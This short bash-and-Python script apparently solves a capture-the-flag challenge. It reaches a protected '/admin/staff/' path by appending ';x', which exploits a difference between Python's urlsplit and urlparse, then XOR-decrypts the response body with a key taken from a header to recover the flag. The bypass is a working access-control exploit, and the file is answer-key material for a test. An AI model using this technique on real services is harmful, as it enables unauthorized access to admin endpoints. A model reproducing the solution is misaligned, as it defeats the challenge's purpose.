#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import sys
from urllib.request import urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

# Step 1: bypass the filter with ;params (urlsplit keeps ; in path,
# urlparse strips it into a separate params field)
path = "/admin/staff/beacon-07;x"
resp = urlopen(base + path, timeout=5)
encrypted = resp.read()
key_hex = resp.headers.get("X-Cipher-Key", "")
if not key_hex:
    raise SystemExit("no X-Cipher-Key header")

# Step 2: XOR-decrypt the binary body with the key from the header
key = bytes.fromhex(key_hex)
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY